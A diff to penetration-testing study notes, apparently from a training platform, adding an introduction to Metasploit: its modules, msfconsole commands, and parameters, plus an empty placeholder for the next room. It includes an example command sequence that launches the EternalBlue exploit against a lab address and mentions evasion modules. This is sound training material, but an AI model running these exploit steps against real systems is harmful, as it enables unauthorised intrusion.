@@ -3312,39 +3312,116 @@ responder -I ens5
 
 ### Room 2 - Metasploit: Introduction
 
+**Learning Objectives**
+- Understand the main components of the Metasploit Framework
+- Navigate and use `msfconsole`
+- Work with modules (exploits, payloads, auxiliary, etc.)
+- Set parameters and run modules
+- Manage sessions
 
+---
 
+#### What is Metasploit?
 
+Metasploit is the most widely used exploitation framework. It supports the entire penetration testing process: information gathering, scanning, exploitation, and post-exploitation.
 
+**Two main versions:**
+- **Metasploit Pro** → Commercial version with GUI
+- **Metasploit Framework** → Open-source, command-line version (what we use)
 
+**Main components:**
+- `msfconsole` → Primary command-line interface
+- **Modules** → Exploits, payloads, scanners, post modules, etc.
+- **Tools** → Stand-alone utilities (e.g. `msfvenom`)
 
+---
 
+#### Key Concepts
 
+| Term | Meaning |
+|------|---------|
+| **Vulnerability** | A flaw in the target system |
+| **Exploit** | Code that takes advantage of a vulnerability |
+| **Payload** | Code that runs on the target after successful exploitation |
 
+---
 
+#### Module Types
 
+| Module Type | Purpose |
+|-------------|---------|
+| **Auxiliary** | Scanners, fuzzers, crawlers, etc. |
+| **Exploits** | Code that exploits vulnerabilities |
+| **Payloads** | Code executed on the target (shells, Meterpreter, etc.) |
+| **Encoders** | Encode payloads to help evade signature-based detection |
+| **Evasion** | Modules designed to bypass antivirus/security tools |
+| **NOPs** | No-Operation instructions (used as padding) |
+| **Post** | Post-exploitation modules |
 
+**Payload types:**
+- **Singles (Inline)** → Self-contained (e.g. `generic/shell_reverse_tcp`)
+- **Staged** → Small stager + larger stage (e.g. `windows/x64/meterpreter/reverse_tcp`)
 
+---
 
+#### Working with msfconsole
 
+**Launch Metasploit:**
+```bash
+msfconsole
+```
 
+**Useful commands:**
 
+| **Command**              | **Purpose**              |
+|--------------------------|--------------------------|
+| `search`                 | Search for modules       |
+| `use`                    | Select a module          |
+| `show options`           | Show required parameters |
+| `set`                    | Set a parameter          |
+| `setg`                   | Set a global parameter   |
+| `unset` / `unset all`    | Clear parameters         |
+| `exploit` or `run`       | Run the module           |
+| `back`                   | Leave the current module |
+| `sessions`               | List active sessions     |
+| `sessions -i <id>`       | Interact with a session  |
+| `background` or `Ctlz+Z` | Background a session     |
 
+---
 
+#### Common Parameters
 
+| **Parameter** | **Meaning**                            |
+|---------------|----------------------------------------|
+| `RHOSTS`      | Target IP address(es)                  |
+| `RPORT`       | Target port                            |
+| `LHOST`       | Your attacking machine IP              |
+| `LPORT`       | Port for reverse connections           |
+| `PAYLOAD`     | Payload to use                         |
+| `SESSION`     | Existing session ID (for post modules) |
 
+**Example workflow:**
 
+```Bash
+msf6 > search eternalblue
+msf6 > use exploit/windows/smb/ms17_010_eternalblue
+msf6 exploit(...) > set RHOSTS 10.10.10.10
+msf6 exploit(...) > set LHOST 10.10.14.5
+msf6 exploit(...) > exploit
+```
 
+---
 
+#### Sessions
 
+After successful exploitation, Metasploit creates a session.
+- List sessions: `sessions`
+- Interact with a session: `sessions -i 1`
+- Background a session: `background` or `Ctrl+Z`
 
+---
 
-
-
-
-
-
-
+**End of Room 2**
 
 </details> <!-- Ends Room 2 -->
 
@@ -3354,6 +3431,40 @@ responder -I ens5
 <summary><strong>Room 3 - Metasploit: Exploitation</strong></summary>
 
 ### Room 3 - Metasploit: Exploitation
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
 </details> <!-- Ends Room 3 -->
 
